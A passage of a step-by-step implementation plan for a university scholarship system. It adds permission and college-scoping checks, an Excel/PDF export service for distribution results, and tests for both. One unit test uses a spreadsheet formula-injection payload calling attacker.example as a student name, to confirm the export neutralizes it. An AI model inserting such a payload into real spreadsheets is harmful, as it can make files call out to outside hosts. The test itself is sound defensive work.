        resp = await client.get(
            DIST_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
        )
    finally:
        app.dependency_overrides.pop(require_college, None)

    assert resp.status_code == 403
    body = resp.json()
    assert "無權限存取此獎學金類型" in (body.get("detail") or body.get("message") or "")


@pytest.mark.asyncio
async def test_distribution_executed_not_leaked_from_other_college(college_client_factory, config, sch_type, db):
    """distribution_executed must reflect THIS college's rankings only. College B
    having executed must not make college A's students render as 未錄取."""
    config.allow_college_view_distribution = True
    await db.commit()

    # College B: executed. College A: a finalized ranking that has NOT been distributed.
    b_ranking = CollegeRanking(
        scholarship_type_id=sch_type.id,
        sub_type_code="nstc",
        academic_year=114,
        semester="first",
        college_code="B",
        ranking_name="nstc 114-1 B",
        total_applications=1,
        is_finalized=True,
        distribution_executed=True,
        allocated_count=1,
    )
    a_ranking = CollegeRanking(
        scholarship_type_id=sch_type.id,
        sub_type_code="nstc",
        academic_year=114,
        semester="first",
        college_code="A",
        ranking_name="nstc 114-1 A",
        total_applications=1,
        is_finalized=True,
        distribution_executed=False,
        allocated_count=0,
    )
    db.add_all([b_ranking, a_ranking])
    await db.commit()
    await db.refresh(a_ranking)

    student = User(
        nycu_id="cvd_student_PRE1",
        email="cvd_student_PRE1@university.edu",
        name="尚未分發生",
        user_type=UserType.student,
        role=UserRole.student,
    )
    db.add(student)
    appn = Application(
        app_id="APP-CVD-PRE1",
        student=student,
        scholarship_type_id=sch_type.id,
        academic_year=114,
        semester="first",
        status="submitted",
        sub_type_selection_mode=SubTypeSelectionMode.single,
        student_data=_student_data("PRE1", "尚未分發生", "A"),
    )
    db.add(appn)
    await db.commit()
    await db.refresh(appn)
    db.add(
        CollegeRankingItem(
            ranking_id=a_ranking.id,
            application_id=appn.id,
            rank_position=1,
            is_allocated=False,
            status="ranked",
        )
    )
    await db.commit()

    cclient = await college_client_factory("A")
    resp = await cclient.get(
        DIST_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    assert resp.status_code == 200
    data = resp.json()["data"]
    assert data["distribution_executed"] is False, "college B's execution must not leak into college A"
    assert data["sub_types"] == []
```

Add `AdminScholarship` to the model import on line 18 if not already present:

```python
from app.models.user import AdminScholarship, User, UserRole, UserType
```

(It is already imported — verify before editing.)

- [ ] **Step 3: Run to verify they fail**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -k "nogrant or not_leaked or without_scholarship_grant" -p no:cacheprovider --no-cov -v
```

Expected: both FAIL — the grant test returns 200 instead of 403; the leak test sees `distribution_executed: True`.

- [ ] **Step 4: Add the grant checks to the loader**

In `_helpers.py`, in `load_college_distribution_results`, insert **immediately after** the `college_code` check and **before** `normalized_semester = normalize_semester_value(semester)`:

```python
    # Permission BEFORE the flag: a college with no grant on this scholarship must
    # get a permission error rather than learn the toggle's state. Mirrors
    # ranking_management.export_ranking_excel and export_package.py.
    if not await _check_scholarship_permission(current_user, scholarship_type_id, db):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="無權限存取此獎學金類型")
    if not await _check_academic_year_permission(current_user, academic_year, db):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="無權限存取此學年度")
```

- [ ] **Step 5: Scope the ranking query by college**

In `_helpers.py`, add the `college_code` predicate to `ranking_stmt`:

```python
    # Rankings are per-college (issue #1034), so scope in SQL: without this,
    # distribution_executed = any(...) below would OR across EVERY college and a
    # college whose own distribution has not run would see its students as 未錄取.
    # Matches ranking_management.get_rankings.
    ranking_stmt = select(CollegeRanking).where(
        and_(
            CollegeRanking.scholarship_type_id == scholarship_type_id,
            CollegeRanking.academic_year == academic_year,
            CollegeRanking.college_code == college_code,
        )
    )
```

- [ ] **Step 6: Run the whole file**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -p no:cacheprovider --no-cov -v
```

Expected: **12 passed**. If the four original tests fail, the Step 1 fixture updates are incomplete — fix the fixtures, not the gates.

- [ ] **Step 7: Run the full backend unit lane to catch collateral damage**

```bash
python3 -m pytest app/tests -m "not integration and not asyncio" -p no:cacheprovider --no-cov -q
```

Expected: **3047 passed** (the Task-1 baseline), 0 failures.

- [ ] **Step 8: Lint and commit**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014 --max-line-length=120
git add backend/app/api/v1/endpoints/college_review/_helpers.py backend/app/tests/test_college_view_distribution.py
git commit -m "fix: enforce scholarship/year grants and scope rankings by college

The distribution-results read checked role + college binding + the admin
toggle, but never whether the college was granted this scholarship — every
sibling college_review endpoint does. Also scope the ranking query by
college_code so distribution_executed reflects this college's own state.

Existing fixtures seeded no grant and no ranking college_code; both were
unrealistic and are corrected."
```

---

### Task 5: Build the export renderer service

Pure rendering, no DB, no FastAPI. Tests are **sync** (unit lane).

**Files:**
- Create: `backend/app/services/college_distribution_export_service.py`
- Test: `backend/app/tests/test_college_distribution_export_service.py`

**Interfaces:**
- Consumes: the `sub_types` list produced by `load_college_distribution_results` (Tasks 1-4) — each group `{code, label, label_en, admitted[], backup[], rejected[]}`, each student `{student_number, student_name, department, rank_position?, backup_position?}`.
- Produces:
  - `DistributionExportRow` (frozen dataclass): `sub_type_label: str`, `outcome: str`, `position: Optional[int]`, `student_number: str`, `student_name: str`, `department: str`
  - `flatten_sub_types(sub_types: List[Dict[str, Any]]) -> List[DistributionExportRow]`
  - `CollegeDistributionExportService.build_workbook(*, rows: List[DistributionExportRow], title: str, sheet_name: str) -> bytes`
  - `CollegeDistributionExportService.build_pdf(*, rows: List[DistributionExportRow], title: str) -> bytes`
  - `HEADERS: List[str]` == `["類別", "結果", "名次", "學號", "姓名", "系所"]`

- [ ] **Step 1: Write the failing tests**

Create `backend/app/tests/test_college_distribution_export_service.py`:

```python
"""Unit tests for the college distribution-results export renderer.

Sync tests -> unit lane. Pure rendering: no DB, no HTTP.
"""

import io

import pytest
from openpyxl import load_workbook

from app.services.college_distribution_export_service import (
    HEADERS,
    CollegeDistributionExportService,
    DistributionExportRow,
    flatten_sub_types,
)


def _sub_types():
    return [
        {
            "code": "nstc",
            "label": "國科會",
            "label_en": "NSTC",
            "admitted": [
                {"student_number": "310460031", "student_name": "王小明", "department": "電子研", "rank_position": 1},
            ],
            "backup": [
                {"student_number": "310460033", "student_name": "張三", "department": "電子研", "backup_position": 1},
            ],
            "rejected": [
                {"student_number": "310460034", "student_name": "李四", "department": "資工研", "rank_position": 5},
            ],
        }
    ]


class TestFlatten:
    def test_flatten_orders_admitted_then_backup_then_rejected(self):
        rows = flatten_sub_types(_sub_types())
        assert [r.outcome for r in rows] == ["正取", "備取", "未錄取"]

    def test_flatten_picks_the_right_position_field_per_bucket(self):
        rows = flatten_sub_types(_sub_types())
        assert [r.position for r in rows] == [1, 1, 5]

    def test_flatten_uses_the_sub_type_label_not_the_raw_code(self):
        rows = flatten_sub_types(_sub_types())
        assert all(r.sub_type_label == "國科會" for r in rows)

    def test_flatten_falls_back_to_code_when_label_missing(self):
        sub_types = [{"code": "unallocated", "admitted": [], "backup": [], "rejected": []}]
        sub_types[0]["rejected"] = [
            {"student_number": "X1", "student_name": "無", "department": "", "rank_position": None}
        ]
        rows = flatten_sub_types(sub_types)
        assert rows[0].sub_type_label == "unallocated"

    def test_flatten_empty_sub_types_yields_no_rows(self):
        assert flatten_sub_types([]) == []


class TestBuildWorkbook:
    def _load(self, payload: bytes):
        return load_workbook(io.BytesIO(payload)).active

    def test_header_row_matches_the_shared_column_model(self):
        svc = CollegeDistributionExportService()
        payload = svc.build_workbook(rows=flatten_sub_types(_sub_types()), title="T", sheet_name="S")
        ws = self._load(payload)
        assert [c.value for c in ws[2]] == HEADERS

    def test_data_rows_render_expected_values(self):
        svc = CollegeDistributionExportService()
        payload = svc.build_workbook(rows=flatten_sub_types(_sub_types()), title="T", sheet_name="S")
        ws = self._load(payload)
        assert [c.value for c in ws[3]] == ["國科會", "正取", 1, "310460031", "王小明", "電子研"]

    def test_missing_position_renders_an_empty_cell_not_the_string_none(self):
        """A None 名次 must never render the literal string "None".

        _row_cells maps None -> "", and openpyxl normalizes an empty string to an
        empty cell (readback value is None, NOT ""). Both are correct; the bug this
        guards against is the cell reading "None".
        """
        rows = [DistributionExportRow("國科會", "未錄取", None, "X1", "無名次", "電子研")]
        svc = CollegeDistributionExportService()
        ws = self._load(svc.build_workbook(rows=rows, title="T", sheet_name="S"))
        value = ws.cell(row=3, column=3).value
        assert value is None, f"expected an empty cell, got {value!r}"

    def test_zero_rows_still_emits_the_header(self):
        svc = CollegeDistributionExportService()
        ws = self._load(svc.build_workbook(rows=[], title="T", sheet_name="S"))
        assert [c.value for c in ws[2]] == HEADERS

    def test_malicious_student_name_is_neutralized(self):
        """SECURITY: openpyxl writes a leading '=' as a LIVE formula and 姓名 comes
        from SIS. Mirrors test_college_ranking_export_service.test_malicious_student_name_is_neutralized.
        """
        payload = '=WEBSERVICE("https://attacker.example/x")'
        rows = [DistributionExportRow("國科會", "正取", 1, "X1", payload, "電子研")]
        svc = CollegeDistributionExportService()
        ws = self._load(svc.build_workbook(rows=rows, title="T", sheet_name="S"))
        value = ws.cell(row=3, column=5).value
        assert not str(value).startswith("="), f"formula injection not neutralized: {value!r}"


class TestBuildPdf:
    def test_returns_a_pdf(self):
        svc = CollegeDistributionExportService()
        payload = svc.build_pdf(rows=flatten_sub_types(_sub_types()), title="114學年度測試分發結果")
        assert payload.startswith(b"%PDF")

    def test_zero_rows_does_not_raise(self):
        svc = CollegeDistributionExportService()
        assert svc.build_pdf(rows=[], title="空").startswith(b"%PDF")

    def test_xml_special_chars_in_name_do_not_break_rendering(self):
        rows = [DistributionExportRow("國科會", "正取", 1, "X1", "A & B <C>", "電子研")]
        svc = CollegeDistributionExportService()
        assert svc.build_pdf(rows=rows, title="T").startswith(b"%PDF")
```

- [ ] **Step 2: Run to verify they fail**

```bash
python3 -m pytest app/tests/test_college_distribution_export_service.py -p no:cacheprovider --no-cov -v
```

Expected: FAIL — `ModuleNotFoundError: No module named 'app.services.college_distribution_export_service'`.

- [ ] **Step 3: Write the service**

Create `backend/app/services/college_distribution_export_service.py`:

```python
"""College distribution-results export service.

Pure rendering logic — receives the ``sub_types`` structure produced by
``load_college_distribution_results`` and returns xlsx or PDF bytes. The endpoint
layer is responsible for loading and authorizing the data.

``build_workbook`` and ``build_pdf`` share one source of truth for the column set
(``_headers``) and per-row cell values (``_row_cells``), so the two formats never
drift apart — the same discipline as ``college_ranking_export_service``.

Unlike the 學生資料彙整表 export this carries NO PII (no 身分證字號, no 匯款帳號):
colleges get exactly what the 分發結果 panel already shows them.
"""

from __future__ import annotations

import io
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

# `escape` is a pure string-escaping helper (`<` → `&lt;` …) used to sanitise
# cell values before they go into reportlab Paragraph markup. It does not parse
# untrusted XML, so the B406 warning is a false positive here.
from xml.sax.saxutils import escape as xml_escape  # nosec B406

from openpyxl import Workbook
from openpyxl.styles import Alignment, Border, Font, PatternFill, Side
from openpyxl.utils import get_column_letter
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4, landscape
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.units import mm
from reportlab.platypus import KeepInFrame, Paragraph, SimpleDocTemplate, Spacer, Table, TableStyle

from app.services.pdf_fonts import CJK_FONT_NAME, ensure_cjk_font
from app.utils.excel_safety import sanitize_excel_cell

# (header label, PDF column weight). HEADERS and the PDF weight vector are both
# derived from this one list so they can never drift — renaming a label can't
# silently mis-size a column. The normalize-to-page-width math lives in
# _pdf_col_widths.
_COLUMNS: List[Tuple[str, float]] = [
    ("類別", 1.4),
    ("結果", 0.7),
    ("名次", 0.6),
    ("學號", 1.2),
    ("姓名", 1.2),
    ("系所", 1.4),
]

HEADERS: List[str] = [label for label, _ in _COLUMNS]
_COL_WEIGHTS: List[float] = [weight for _, weight in _COLUMNS]

# (group key, 結果 label, position field) — drives both flattening order and the
# per-bucket position column, so 正取/備取/未錄取 ordering is defined in one place.
_OUTCOME_BUCKETS: Tuple[Tuple[str, str, str], ...] = (
    ("admitted", "正取", "rank_position"),
    ("backup", "備取", "backup_position"),
    ("rejected", "未錄取", "rank_position"),
)


@dataclass(frozen=True)
class DistributionExportRow:
    """One student's outcome within one sub-type."""

    sub_type_label: str
    outcome: str  # 正取 / 備取 / 未錄取
    position: Optional[int]
    student_number: str
    student_name: str
    department: str


def flatten_sub_types(sub_types: List[Dict[str, Any]]) -> List[DistributionExportRow]:
    """Flatten the grouped loader payload into export rows.

    Preserves the loader's ordering (it already sorted each bucket), so the export
    reads in the same order as the panel.
    """
    rows: List[DistributionExportRow] = []
    for group in sub_types:
        label = group.get("label") or group.get("code") or ""
        for key, outcome, position_field in _OUTCOME_BUCKETS:
            for student in group.get(key) or []:
                rows.append(
                    DistributionExportRow(
                        sub_type_label=label,
                        outcome=outcome,
                        position=student.get(position_field),
                        student_number=student.get("student_number") or "",
                        student_name=student.get("student_name") or "",
                        department=student.get("department") or "",
                    )
                )
    return rows


class CollegeDistributionExportService:
    """Builds 分發結果 workbooks and PDFs."""

    def build_workbook(self, *, rows: List[DistributionExportRow], title: str, sheet_name: str) -> bytes:
        wb = Workbook()
        ws = wb.active
        ws.title = sheet_name

        headers = self._headers()
        total_cols = len(headers)

        # Row 1: title (merged across all columns)
        ws.cell(row=1, column=1, value=title)
        if total_cols > 1:
            ws.merge_cells(start_row=1, start_column=1, end_row=1, end_column=total_cols)
        title_cell = ws.cell(row=1, column=1)
        title_cell.font = Font(bold=True, size=14)
        title_cell.alignment = Alignment(horizontal="center", vertical="center")

        # Row 2: header
        for col_idx, header in enumerate(headers, start=1):
            cell = ws.cell(row=2, column=col_idx, value=header)
            cell.font = Font(bold=True)
            cell.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
            cell.fill = PatternFill("solid", fgColor="DDDDDD")

        # Data rows — written from the same _row_cells used by the PDF export
        for idx, row in enumerate(rows, start=1):
            excel_row = idx + 2  # +2 because rows 1-2 are title/header
            for col_idx, value in enumerate(self._row_cells(row), start=1):
                # SECURITY: neutralize spreadsheet formula injection — openpyxl writes
                # a leading "=" as a LIVE formula and 姓名/系所 come from SIS.
                ws.cell(row=excel_row, column=col_idx, value=sanitize_excel_cell(value))

        max_row = len(rows) + 2
        self._apply_borders(ws, max_row=max_row, max_col=total_cols)
        self._apply_column_widths(ws, headers)
        ws.freeze_panes = "A3"

        buf = io.BytesIO()
        wb.save(buf)
        return buf.getvalue()

    def build_pdf(self, *, rows: List[DistributionExportRow], title: str) -> bytes:
        """Render the same 分發結果 table as an A4-landscape PDF.

        Mirrors ``build_workbook`` exactly (same columns, rows and ordering via
        ``_headers`` / ``_row_cells``). Column widths are normalised to the usable
        page width; rows paginate vertically with the header repeated per page.

        ``sanitize_excel_cell`` is deliberately NOT applied here: reportlab has no
        formula semantics, so the apostrophe prefix would be a visible artifact.
        This is the one place the two formats legitimately diverge.
        """
        ensure_cjk_font()

        headers = self._headers()

        page_width, page_height = landscape(A4)
        usable_width = page_width - (self._PDF_MARGIN_PT * 2)
        col_widths = self._pdf_col_widths(headers, usable_width)
        # A reportlab Table cannot split ONE row across pages, so cap each cell to the
        # usable content height and let KeepInFrame shrink anything taller.
        cell_max_height = page_height - (self._PDF_MARGIN_PT * 2) - self._PDF_HEADER_RESERVE_PT

        title_style = ParagraphStyle(
            "DistributionPdfTitle",
            fontName=CJK_FONT_NAME,
            fontSize=12,
            leading=15,
            alignment=1,  # center
        )
        header_style = ParagraphStyle(
            "DistributionPdfHeader",
            fontName=CJK_FONT_NAME,
            fontSize=8,
            leading=10,
            alignment=1,
            wordWrap="CJK",
        )
        cell_style = ParagraphStyle(
            "DistributionPdfCell",
            fontName=CJK_FONT_NAME,
            fontSize=7.5,
            leading=9,
            wordWrap="CJK",  # break long CJK and unspaced ASCII
        )

        data: List[list] = [[Paragraph(xml_escape(h), header_style) for h in headers]]
        for row in rows:
            values = self._row_cells(row)
            data.append(
                [
                    KeepInFrame(
                        col_widths[col],
                        cell_max_height,
                        [Paragraph(xml_escape(self._safe_str(v)), cell_style)],
                        mode="shrink",
                    )
                    for col, v in enumerate(values)
                ]
            )

        table = Table(data, colWidths=col_widths, repeatRows=1)
        table.setStyle(
            TableStyle(
                [
                    ("GRID", (0, 0), (-1, -1), 0.4, colors.Color(0.6, 0.6, 0.6)),
                    ("BACKGROUND", (0, 0), (-1, 0), colors.Color(0.87, 0.87, 0.87)),
                    ("VALIGN", (0, 0), (-1, -1), "TOP"),
                    ("FONTNAME", (0, 0), (-1, -1), CJK_FONT_NAME),
                    ("LEFTPADDING", (0, 0), (-1, -1), 3),
                    ("RIGHTPADDING", (0, 0), (-1, -1), 3),
                    ("TOPPADDING", (0, 0), (-1, -1), 2),
                    ("BOTTOMPADDING", (0, 0), (-1, -1), 2),
                ]
            )
        )

        buf = io.BytesIO()
        doc = SimpleDocTemplate(
            buf,
            pagesize=landscape(A4),
            leftMargin=self._PDF_MARGIN_PT,
            rightMargin=self._PDF_MARGIN_PT,
            topMargin=self._PDF_MARGIN_PT,
            bottomMargin=self._PDF_MARGIN_PT,
        )
        doc.build([Paragraph(xml_escape(title), title_style), Spacer(1, 4 * mm), table])
        return buf.getvalue()

    # -------- PDF layout helpers --------

    _PDF_MARGIN_PT = 10 * mm
    # Vertical space reserved (per page) for the title + spacer + repeated header row.
    _PDF_HEADER_RESERVE_PT = 60

    def _pdf_col_widths(self, headers: List[str], usable_width: float) -> List[float]:
        total = sum(_COL_WEIGHTS) or 1.0
        return [usable_width * w / total for w in _COL_WEIGHTS]

    # -------- Shared column/value model (single source of truth) --------

    def _headers(self) -> List[str]:
        return list(HEADERS)

    def _row_cells(self, row: DistributionExportRow) -> List[Any]:
        """Ordered cell values for one row.

        The xlsx writer keeps the native int for 名次 (proper Excel typing); the PDF
        renderer stringifies it. Both share this list so the formats render identical
        content.
        """
        return [
            row.sub_type_label,
            row.outcome,
            row.position if row.position is not None else "",
            row.student_number,
            row.student_name,
            row.department,
        ]

    def _safe_str(self, value: Any) -> str:
        if value is None:
            return ""
        return str(value)

    # -------- Formatting --------

    def _apply_borders(self, ws, *, max_row: int, max_col: int) -> None:
        thin = Side(style="thin", color="999999")
        border = Border(left=thin, right=thin, top=thin, bottom=thin)
        for r in range(2, max_row + 1):
            for c in range(1, max_col + 1):
                ws.cell(row=r, column=c).border = border

    def _apply_column_widths(self, ws, headers: List[str]) -> None:
        for idx, header in enumerate(headers, start=1):
            text_len = max(len(str(header)), 6)
            width = min(max(text_len + 4, 10), 30)
            ws.column_dimensions[get_column_letter(idx)].width = width
```

- [ ] **Step 4: Run to verify they pass**

```bash
python3 -m pytest app/tests/test_college_distribution_export_service.py -p no:cacheprovider --no-cov -v
```

Expected: **13 passed** (5 flatten + 5 workbook + 3 pdf).

Note: the PDF tests need the WQY font at `/usr/share/fonts/truetype/wqy/wqy-zenhei.ttc`. Verified present on this host (16MB), so they run here as-is.

- [ ] **Step 5: Lint and commit**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014 --max-line-length=120
git add backend/app/services/college_distribution_export_service.py backend/app/tests/test_college_distribution_export_service.py
git commit -m "feat: add college distribution-results export renderer

build_workbook and build_pdf share one _COLUMNS list so the formats cannot
drift. Excel cells pass through sanitize_excel_cell (openpyxl writes a
leading '=' as a live formula and 姓名 comes from SIS); the PDF does not,
since reportlab has no formula semantics."
```

---

### Task 6: Add the export endpoint

**Files:**
- Modify: `backend/app/api/v1/endpoints/college_review/distribution.py`
- Test: `backend/app/tests/test_college_distribution_export_endpoint.py`

**Interfaces:**
- Consumes: `load_college_distribution_results` (Tasks 1-4); `CollegeDistributionExportService`, `flatten_sub_types` (Task 5); `XLSX_MEDIA_TYPE` (`.application_summary_export:53`).
- Produces: `GET /api/v1/college-review/distribution-results/export?scholarship_type_id&academic_year&semester&format=xlsx|pdf` → `StreamingResponse`.

- [ ] **Step 1: Write the failing tests**

Create `backend/app/tests/test_college_distribution_export_endpoint.py`:

```python
"""Integration tests for the college distribution-results Excel/PDF export.

Cross-college isolation is asserted by PARSING the workbook rows — never by
scanning response bytes, which would false-negative on xlsx compression.
"""

import io

import pytest
import pytest_asyncio
from httpx import AsyncClient
from openpyxl import load_workbook
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.security import require_college
from app.main import app
from app.models.application import Application
from app.models.college_review import CollegeRanking, CollegeRankingItem
from app.models.scholarship import (
    ScholarshipConfiguration,
    ScholarshipStatus,
    ScholarshipType,
    SubTypeSelectionMode,
)
from app.models.user import AdminScholarship, User, UserRole, UserType

EXPORT_URL = "/api/v1/college-review/distribution-results/export"


@pytest_asyncio.fixture
async def sch_type(db: AsyncSession) -> ScholarshipType:
    st = ScholarshipType(
        code="cde_phd",
        name="CDE PhD Scholarship",
        description="college-distribution-export test",
        status=ScholarshipStatus.active.value,
    )
    db.add(st)
    await db.commit()
    await db.refresh(st)
    return st


@pytest_asyncio.fixture
async def config(db: AsyncSession, sch_type) -> ScholarshipConfiguration:
    cfg = ScholarshipConfiguration(
        scholarship_type_id=sch_type.id,
        config_name="CDE 114-1",
        config_code="CDE-114-1",
        academic_year=114,
        semester="first",
        amount=40000,
        is_active=True,
        allow_college_view_distribution=True,
    )
    db.add(cfg)
    await db.commit()
    await db.refresh(cfg)
    return cfg


@pytest_asyncio.fixture
async def college_client(db: AsyncSession, client: AsyncClient, sch_type) -> AsyncClient:
    user = User(
        nycu_id="cde_college_A",
        email="cde_college_A@university.edu",
        name="College A",
        user_type=UserType.employee,
        role=UserRole.college,
        college_code="A",
    )
    db.add(user)
    await db.commit()
    await db.refresh(user)
    db.add(AdminScholarship(admin_id=user.id, scholarship_id=sch_type.id))
    await db.commit()

    async def override_college():
        return user

    app.dependency_overrides[require_college] = override_college
    try:
        yield client
    finally:
        app.dependency_overrides.pop(require_college, None)


async def _seed(db, sch_type):
    """Two colleges' rankings; college A has 正取/未錄取, college B has one 正取."""
    rankings = {}
    for code in ("A", "B"):
        r = CollegeRanking(
            scholarship_type_id=sch_type.id,
            sub_type_code="nstc",
            academic_year=114,
            semester="first",
            college_code=code,
            ranking_name=f"nstc 114-1 {code}",
            total_applications=2,
            is_finalized=True,
            distribution_executed=True,
            allocated_count=1,
        )
        db.add(r)
        rankings[code] = r
    await db.commit()
    for r in rankings.values():
        await db.refresh(r)

    def app_row(sid, name, academy, dept):
        student = User(
            nycu_id=f"cde_student_{sid}",
            email=f"cde_student_{sid}@university.edu",
            name=name,
            user_type=UserType.student,
            role=UserRole.student,
        )
        db.add(student)
        return Application(
            app_id=f"APP-CDE-{sid}",
            student=student,
            scholarship_type_id=sch_type.id,
            academic_year=114,
            semester="first",
            status="approved",
            sub_type_selection_mode=SubTypeSelectionMode.single,
            student_data={
                "std_stdcode": sid,
                "std_cname": name,
                "std_academyno": academy,
                "trm_depname": dept,
            },
        )

    a_admit = app_row("A001", "王小明", "A", "電子研")
    a_reject = app_row("A003", "張三", "A", "資工研")
    b_admit = app_row("B001", "他院生", "B", "機械研")
    for a in (a_admit, a_reject, b_admit):
        db.add(a)
    await db.commit()
    for a in (a_admit, a_reject, b_admit):
        await db.refresh(a)

    db.add_all(
        [
            CollegeRankingItem(
                ranking_id=rankings["A"].id,
                application_id=a_admit.id,
                rank_position=1,
                is_allocated=True,
                allocated_sub_type="nstc",
                status="allocated",
            ),
            CollegeRankingItem(
                ranking_id=rankings["A"].id,
                application_id=a_reject.id,
                rank_position=2,
                is_allocated=False,
                status="rejected",
            ),
            CollegeRankingItem(
                ranking_id=rankings["B"].id,
                application_id=b_admit.id,
                rank_position=1,
                is_allocated=True,
                allocated_sub_type="nstc",
                status="allocated",
            ),
        ]
    )
    await db.commit()


def _rows(payload: bytes):
    ws = load_workbook(io.BytesIO(payload)).active
    return [[c.value for c in row] for row in ws.iter_rows(min_row=3)]


PARAMS = {"scholarship_type_id": None, "academic_year": 114, "semester": "first"}


@pytest.mark.asyncio
async def test_export_xlsx_contains_only_this_college(college_client, config, sch_type, db):
    """THE isolation test: parse the workbook and assert college B's student is
    absent from college A's export."""
    await _seed(db, sch_type)
    resp = await college_client.get(
        EXPORT_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    assert resp.status_code == 200
    rows = _rows(resp.content)
    numbers = {r[3] for r in rows}
    assert numbers == {"A001", "A003"}
    assert "B001" not in numbers
    names = {r[4] for r in rows}
    assert "他院生" not in names


@pytest.mark.asyncio
async def test_export_xlsx_row_contents(college_client, config, sch_type, db):
    await _seed(db, sch_type)
    resp = await college_client.get(
        EXPORT_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    rows = _rows(resp.content)
    admitted = next(r for r in rows if r[3] == "A001")
    assert admitted[1] == "正取"
    assert admitted[2] == 1
    assert admitted[4] == "王小明"
    assert admitted[5] == "電子研"

    rejected = next(r for r in rows if r[3] == "A003")
    assert rejected[1] == "未錄取"
    assert rejected[2] == 2  # 名次 populated on 未錄取 too
    assert rejected[5] == "資工研"


@pytest.mark.asyncio
async def test_export_pdf_returns_pdf_bytes(college_client, config, sch_type, db):
    await _seed(db, sch_type)
    resp = await college_client.get(
        EXPORT_URL,
        params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first", "format": "pdf"},
    )
    assert resp.status_code == 200
    assert resp.headers["content-type"] == "application/pdf"
    assert resp.content.startswith(b"%PDF")


@pytest.mark.asyncio
async def test_export_sets_utf8_filename_header(college_client, config, sch_type, db):
    await _seed(db, sch_type)
    resp = await college_client.get(
        EXPORT_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    disposition = resp.headers["content-disposition"]
    assert disposition.startswith("attachment; filename*=UTF-8''")
    assert resp.headers["content-length"] == str(len(resp.content))


@pytest.mark.asyncio
async def test_export_403_when_flag_off(college_client, config, sch_type, db):
    """The export inherits the loader's gate — no separate check to forget."""
    config.allow_college_view_distribution = False
    await db.commit()
    await _seed(db, sch_type)
    resp = await college_client.get(
        EXPORT_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    assert resp.status_code == 403
    body = resp.json()
    assert "分發結果尚未開放查看" in (body.get("detail") or body.get("message") or "")


@pytest.mark.asyncio
async def test_export_403_without_grant(client, config, sch_type, db):
    await _seed(db, sch_type)
    ungranted = User(
        nycu_id="cde_college_nogrant",
        email="cde_college_nogrant@university.edu",
        name="No Grant",
        user_type=UserType.employee,
        role=UserRole.college,
        college_code="A",
    )
    db.add(ungranted)
    await db.commit()

    async def override_college():
        return ungranted

    app.dependency_overrides[require_college] = override_college
    try:
        resp = await client.get(
            EXPORT_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
        )
    finally:
        app.dependency_overrides.pop(require_college, None)
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_export_rejects_unknown_format(college_client, config, sch_type, db):
    await _seed(db, sch_type)
    resp = await college_client.get(
        EXPORT_URL,
        params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first", "format": "csv"},
    )
    assert resp.status_code == 422  # FastAPI Literal validation
```

- [ ] **Step 2: Run to verify they fail**

```bash
python3 -m pytest app/tests/test_college_distribution_export_endpoint.py -p no:cacheprovider --no-cov -v
```

Expected: FAIL — 404 (route does not exist).

- [ ] **Step 3: Add the imports to `distribution.py`**

```python
from typing import Literal, Optional
from urllib.parse import quote as _url_quote

from fastapi.responses import StreamingResponse

from app.models.scholarship import ScholarshipType
from app.services.college_distribution_export_service import (
    CollegeDistributionExportService,
    flatten_sub_types,
)

from .application_summary_export import XLSX_MEDIA_TYPE
```

Merge `Literal` into the existing `typing` import rather than adding a second line. `ScholarshipType` may have been removed in Task 1 Step 5 — re-add it if so.

- [ ] **Step 4: Append the export endpoint to `distribution.py`**

```python
@router.get("/distribution-results/export")
async def export_college_distribution_results(
    scholarship_type_id: int,
    academic_year: int,
    semester: Optional[str] = None,
    format: Literal["xlsx", "pdf"] = Query("xlsx", description="Output format: xlsx (default) or pdf"),
    current_user: User = Depends(require_college),
    db: AsyncSession = Depends(get_db),
):
    """Export this college's own distribution results as Excel (default) or PDF.

    Reads through the SAME loader as the JSON endpoint, so the file can never show a
    student the panel would not. Carries no PII (學號/姓名/系所 + outcome only), so
    unlike the 學生資料彙整表 export it writes no pii_access AuditLog.
    """
    data = await load_college_distribution_results(
        db,
        current_user=current_user,
        scholarship_type_id=scholarship_type_id,
        academic_year=academic_year,
        semester=semester,
    )
    rows = flatten_sub_types(data["sub_types"])

    scholarship_name = (
        await db.execute(select(ScholarshipType.name).where(ScholarshipType.id == scholarship_type_id))
    ).scalar_one_or_none() or "獎學金"

    college_label = current_user.college_code
    title = f"{academic_year}學年度{scholarship_name}分發結果（{college_label}）"
    extension = format  # Literal["xlsx", "pdf"] — extension IS the format
    base_filename = f"{academic_year}學年度{scholarship_name}分發結果_{college_label}.{extension}"
    encoded = _url_quote(base_filename, safe="")

    service = CollegeDistributionExportService()
    if format == "pdf":
        payload = service.build_pdf(rows=rows, title=title)
        media_type = "application/pdf"
    else:
        payload = service.build_workbook(rows=rows, title=title, sheet_name=f"{academic_year}學年")
        media_type = XLSX_MEDIA_TYPE

    return StreamingResponse(
        iter([payload]),
        media_type=media_type,
        headers={
            "Content-Disposition": f"attachment; filename*=UTF-8''{encoded}",
            "Content-Length": str(len(payload)),
        },
    )
```

- [ ] **Step 5: Run to verify they pass**

```bash
